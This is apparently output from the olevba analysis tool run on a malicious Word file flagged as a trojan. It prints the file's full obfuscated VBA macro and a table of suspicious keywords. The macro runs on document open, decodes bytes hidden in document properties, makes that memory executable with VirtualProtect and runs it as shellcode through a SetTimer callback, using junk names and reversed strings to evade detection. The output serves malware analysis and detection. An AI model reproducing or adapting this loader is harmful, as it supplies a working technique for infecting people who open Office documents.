olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-09badb86da12731da9eb12e86115451477904e978256b126bee2cf64ab2418f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-09badb86da12731da9eb12e86115451477904e978256b126bee2cf64ab2418f5 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function UnlobedHaylofts Lib "user32" Alias "SetTimer" (ByVal OvertrueIrreclaimed As LongPtr, ByVal FlunkeyismRadiumsGratillity As LongPtr, ByVal UnmashedSpellbind As LongPtr, ByVal PanaposporyHematogenPentecontoglossal As LongPtr) As LongPtr
Private Declare PtrSafe Function SpoffySubstantiation Lib "user32" Alias "KillTimer" (ByVal NefandousHerdedSporodochia As LongPtr, ByVal HeadmanReinfectsShirrs As LongPtr) As LongPtr
Private Declare PtrSafe Function FarettaOrganomercurial Lib "kernel32" Alias "VirtualProtect" (ByVal ScummerRoadworthy As LongPtr, ByVal GerbilAgamobia As LongPtr, ByVal PriedSplurge As LongPtr, DualinSharn As LongPtr) As LongPtr
#Else
Private Declare Function UnlobedHaylofts Lib "user32" Alias "SetTimer" ( ByVal LibrisCrossbeam As Long, ByVal QuadrillionthsSkeletonianCorresponder As Long, ByVal HydrophilicHuarizo As Long, ByVal IsagonPothunt As Any) As Long
Private Declare Function SpoffySubstantiation Lib "user32" Alias "KillTimer" ( ByVal InoculatedPompa As Long, ByVal MetumpsUnofficinalEndearing As Long) As Long
Private Declare Function FarettaOrganomercurial Lib "kernel32" Alias "VirtualProtect"  (ByVal BradyspermatismUnintermissiveCabbed As Long, ByVal SwinkingUnfoldingOverzealously As Long, ByVal TegumentaVowelismUnhook As Long, NubbinsAuxiliate As Long) As Long
#End If
Private Sub Document_Open()
Dim TzapotecEncarnadine() As Byte
#If Win64 Then
TzapotecEncarnadine = MultispiredFurfuranCloudy(ActiveDocument.BuiltInDocumentProperties(MoZFp3t9f("qQOl8a")).Value)
#Else
TzapotecEncarnadine = MultispiredFurfuranCloudy(ActiveDocument.BuiltInDocumentProperties(MoZFp3t9f("Pc6qQXdI")).Value)
#End If
#If VBA7 Then
Dim ExomisBorons As LongPtr
Dim RhodospermeaeOpisthogyrateZoolaters As LongPtr
Dim shellCode As LongPtr
Dim PermixableZeoscopeMaleinoidal As LongPtr
#Else
Dim ExomisBorons As Long
Dim RhodospermeaeOpisthogyrateZoolaters As Long
Dim shellCode As Long
Dim PermixableZeoscopeMaleinoidal As Long
#End If
RhodospermeaeOpisthogyrateZoolaters = UBound(TzapotecEncarnadine) + 1
shellCode = VarPtr(TzapotecEncarnadine(0))
FarettaOrganomercurial shellCode, RhodospermeaeOpisthogyrateZoolaters, 64, VarPtr(ExomisBorons)
GetObject(MoZFp3t9f("brebWzVD3Fu9c")).Environment(MoZFp3t9f("MMMCzhZfOnU"))(MoZFp3t9f("fE0v7h4")) = ActiveDocument.FullName
GetObject(MoZFp3t9f("F32JnCH7Qr")).Environment(MoZFp3t9f("FDUspIeKU9"))(MoZFp3t9f("Oygqe0tlLmWrS")) = MoZFp3t9f("BmUR8P3Cgj5v")
PermixableZeoscopeMaleinoidal = UnlobedHaylofts(0, shellCode, 1, shellCode)
UnharmonisingSedgierOrgandie 1
SpoffySubstantiation 0, PermixableZeoscopeMaleinoidal
GetObject(MoZFp3t9f("RzF5zZ1vq")).Environment(MoZFp3t9f("ZurICc_wKRz8c")).Remove (MoZFp3t9f("huFfLnQaG"))
GetObject(MoZFp3t9f("ZAd2Bzxl")).Environment(MoZFp3t9f("ZYBTP5icwIYV")).Remove (MoZFp3t9f("rBhWi5E3"))
ReDim TzapotecEncarnadine(1)
End Sub
Sub UnharmonisingSedgierOrgandie(Finish)
Dim FollowedMyoelectricUnvocal As Long
Dim PhylesisIrregulousGravediggers As Long
PhylesisIrregulousGravediggers = Timer() + (Finish)
Do
FollowedMyoelectricUnvocal = Timer()
DoEvents
Loop Until FollowedMyoelectricUnvocal > PhylesisIrregulousGravediggers
End Sub
Function DiscruciateDispiritment(MisogamyUnresignedly, HayloftPakchoiFindhorn)
DiscruciateDispiritment = Mid(MisogamyUnresignedly, HayloftPakchoiFindhorn + 1, 1)
End Function
Function InvolutedVelures(UmbellateVoiturierPitcher) As Long
If Int(Rnd(23)) > 2 Then
InvolutedVelures = 9000
Else
InvolutedVelures = Len(UmbellateVoiturierPitcher)
End If
End Function
Public Function MoZFp3t9f(strInput)
MoZFp3t9f = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function MultispiredFurfuranCloudy(AlkaliserChirmsStonefly)
ReDim ThyreocoridaeUnattaintHomoeomeria(InvolutedVelures(AlkaliserChirmsStonefly) - 1) As Byte
Dim HematochromePremultiply As Long, FaradaysNonsubscriptedNonimpeachability As Long
Dim PhosphatizedPyrophile: PhosphatizedPyrophile = MoZFp3t9f("oVWhtBwP") & MoZFp3t9f("CaTHvmM8QQYLR")
For HematochromePremultiply = 0 To InvolutedVelures(AlkaliserChirmsStonefly) - 1 Step 2
FaradaysNonsubscriptedNonimpeachability = HematochromePremultiply / 2
ThyreocoridaeUnattaintHomoeomeria(FaradaysNonsubscriptedNonimpeachability) = CDec(PhosphatizedPyrophile & DiscruciateDispiritment(AlkaliserChirmsStonefly, HematochromePremultiply) & DiscruciateDispiritment(AlkaliserChirmsStonefly, HematochromePremultiply + 1))
Next
MultispiredFurfuranCloudy = ThyreocoridaeUnattaintHomoeomeria
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

